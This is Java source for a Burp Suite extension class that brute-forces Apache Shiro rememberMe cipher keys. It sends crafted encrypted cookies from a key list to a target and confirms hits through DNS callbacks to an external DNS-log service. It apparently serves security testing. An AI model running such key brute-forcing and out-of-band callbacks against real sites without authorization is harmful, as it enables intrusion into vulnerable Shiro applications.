package burp.Application.ShiroCipherKeyDetection.ExtensionMethod;

import java.net.URL;
import java.util.ArrayList;
import java.io.PrintWriter;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import burp.IParameter;
import burp.IScanIssue;

import burp.Application.ShiroFingerprintDetection.ShiroFingerprint;

import burp.CustomScanIssue;
import burp.DnsLogModule.DnsLog;
import burp.Bootstrap.ShiroUrlDns;

public class ShiroCipherKeyMethod1 extends ShiroCipherKeyMethodAbstract {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private IHttpRequestResponse baseRequestResponse;

    private String[] keys;

    private String rememberMeCookieName;

    private DnsLog dnsLog;

    private String sendDnsLogUrl;

    private ArrayList<ShiroUrlDns> shiroUrlDnsCheckArrayList = new ArrayList<ShiroUrlDns>();
    private ArrayList<IHttpRequestResponse> httpRequestResponseArrayList = new ArrayList<IHttpRequestResponse>();

    public ShiroCipherKeyMethod1(IBurpExtenderCallbacks callbacks,
                                 IHttpRequestResponse baseRequestResponse,
                                 String[] keys,
                                 ShiroFingerprint shiroFingerprint) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();

        this.baseRequestResponse = baseRequestResponse;

        this.dnsLog = new DnsLog(this.callbacks, "DnsLogCn");

        this.keys = keys;
        this.rememberMeCookieName = shiroFingerprint.run().getResponseDefaultRememberMeCookieName();

        this.setExtensionName("ShiroCipherKeyMethod1");

        this.runExtension();
    }

    private void runExtension() {
        if (this.keys == null || this.keys.length <= 0) {
            throw new IllegalArgumentException("shiro加密key检测扩展-要进行爆破的keys不能为空, 请检查");
        }

        // 加密key检测
        for (String key : keys) {
            // 说明检测到shiro key了
            if (this.isShiroCipherKeyExists()) {
                return;
            }

            // 如果dnslog有内容但是 this.isShiroCipherKeyExists() 为false
            // 这可能是因为 请求发出去了 dnslog还没反应过来
            // 这种情况后面的循环就没必要了, 退出该循环
            // 等待二次验证即可
            if (this.dnsLog.run().getBodyContent() != null) {
                if (this.dnsLog.run().getBodyContent().length() >= 1) {
                    break;
                }
            }

            this.cipherKeyDetection(key);
        }

        // 防止因为dnslog卡导致没有检测到的问题, 这里进行二次检测, 保证不会漏报

        // 睡眠一段时间, 给dnslog一个缓冲时间
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }

        // 开始进行二次验证
        String dnsLogBodyContent = this.dnsLog.run().getBodyContent();
        if (dnsLogBodyContent == null || dnsLogBodyContent.length() <= 0) {
            return;
        }

        for (int i = 0; i < shiroUrlDnsCheckArrayList.size(); i++) {
            // dnslog 内容匹配判断
            if (!dnsLogBodyContent.contains(shiroUrlDnsCheckArrayList.get(i).getSendDnsLogUrl())) {
                return;
            }

            // 设置问题详情
            this.setIssuesDetail(httpRequestResponseArrayList.get(i), shiroUrlDnsCheckArrayList.get(i));

            return;
        }
    }

    /**
     * 加密key检测
     */
    private void cipherKeyDetection(String key) {
        ShiroUrlDns shiroUrlDnsCheck = new ShiroUrlDns(key, this.dnsLog.run().getTemporaryDomainName());

        // 请求发送
        IHttpService httpService = this.baseRequestResponse.getHttpService();
        IParameter newParameter = this.helpers.buildParameter(
                                    this.rememberMeCookieName,
                                    shiroUrlDnsCheck.getRememberMeEncryptValue(),
                                    (byte)2);
        byte[] newRequest = this.helpers.updateParameter(this.baseRequestResponse.getRequest(), newParameter);
        IHttpRequestResponse newHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);

        // 相关变量设置
        shiroUrlDnsCheckArrayList.add(shiroUrlDnsCheck);
        httpRequestResponseArrayList.add(newHttpRequestResponse);

        // dnslog 返回的内容判断
        String dnsLogBodyContent = this.dnsLog.run().getBodyContent();
        if (dnsLogBodyContent == null || dnsLogBodyContent.length() <= 0) {
            return;
        }

        // dnslog 内容匹配判断
        String sendDnsLogUrl = shiroUrlDnsCheck.getSendDnsLogUrl();
        if (!dnsLogBodyContent.contains(sendDnsLogUrl)) {
            return;
        }

        // 设置问题详情
        this.setIssuesDetail(newHttpRequestResponse, shiroUrlDnsCheck);
    }

    /**
     * 设置问题详情
     */
    private void setIssuesDetail(IHttpRequestResponse httpRequestResponse, ShiroUrlDns shiroUrlDnsCheck) {
        this.setShiroCipherKeyExists();
        this.setCipherKey(shiroUrlDnsCheck.getKey());
        this.setHttpRequestResponse(httpRequestResponse);

        this.sendDnsLogUrl = shiroUrlDnsCheck.getSendDnsLogUrl();
    }

    @Override
    public IScanIssue export() {
        if (!this.isShiroCipherKeyExists()) {
            return null;
        }

        IHttpRequestResponse newHttpRequestResponse = this.getHttpRequestResponse();
        URL newHttpRequestUrl = this.helpers.analyzeRequest(newHttpRequestResponse).getUrl();

        String str1 = String.format("<br/>=============ShiroCipherKeyDetail============<br/>");
        String str2 = String.format("ExtensionMethod: %s <br/>", this.getExtensionName());
        String str3 = String.format("CookieName: %s <br/>",this.rememberMeCookieName);
        String str4 = String.format("ShiroCipherKey: %s <br/>", this.getCipherKey());
        String str5 = String.format("sendDnsLogUrl: %s <br/>", this.sendDnsLogUrl);
        String str6 = String.format("=====================================<br/>");

        // dnslog 详情输出
        String str7 = this.dnsLog.run().export();

        String detail = str1 + str2 + str3 + str4 + str5 + str6 + str7;

        return new CustomScanIssue(
                newHttpRequestResponse.getHttpService(),
                newHttpRequestUrl,
                new IHttpRequestResponse[] { newHttpRequestResponse },
                "ShiroCipherKey",
                detail,
                "High");
    }

    @Override
    public void consoleExport() {
        if (!this.isShiroCipherKeyExists()) {
            return;
        }

        IHttpRequestResponse newHttpRequestResponse = this.getHttpRequestResponse();
        URL newHttpRequestUrl = this.helpers.analyzeRequest(newHttpRequestResponse).getUrl();
        String newHttpRequestMethod = this.helpers.analyzeRequest(newHttpRequestResponse.getRequest()).getMethod();
        int newHttpResponseStatusCode = this.helpers.analyzeResponse(newHttpRequestResponse.getResponse()).getStatusCode();

        PrintWriter stdout = new PrintWriter(this.callbacks.getStdout(), true);

        stdout.println("");
        stdout.println("===========shiro加密key详情============");
        stdout.println("你好呀~ (≧ω≦*)喵~");
        stdout.println("这边检测到有一个站点使用了 shiro框架 喵~");
        stdout.println(String.format("负责检测的插件: %s", this.getExtensionName()));
        stdout.println(String.format("url: %s", newHttpRequestUrl));
        stdout.println(String.format("请求方法: %s", newHttpRequestMethod));
        stdout.println(String.format("页面http状态: %d", newHttpResponseStatusCode));
        stdout.println(String.format("对应的Cookie键: %s", this.rememberMeCookieName));
        stdout.println(String.format("Shiro加密key: %s", this.getCipherKey()));
        stdout.println(String.format("发送的dnsLogUrl: %s", this.sendDnsLogUrl));
        stdout.println("详情请查看-Burp Scanner模块-Issue activity界面");
        stdout.println("===================================");
        stdout.println("");

        // dnslog 控制台详情输出
        this.dnsLog.run().consoleExport();
    }
}
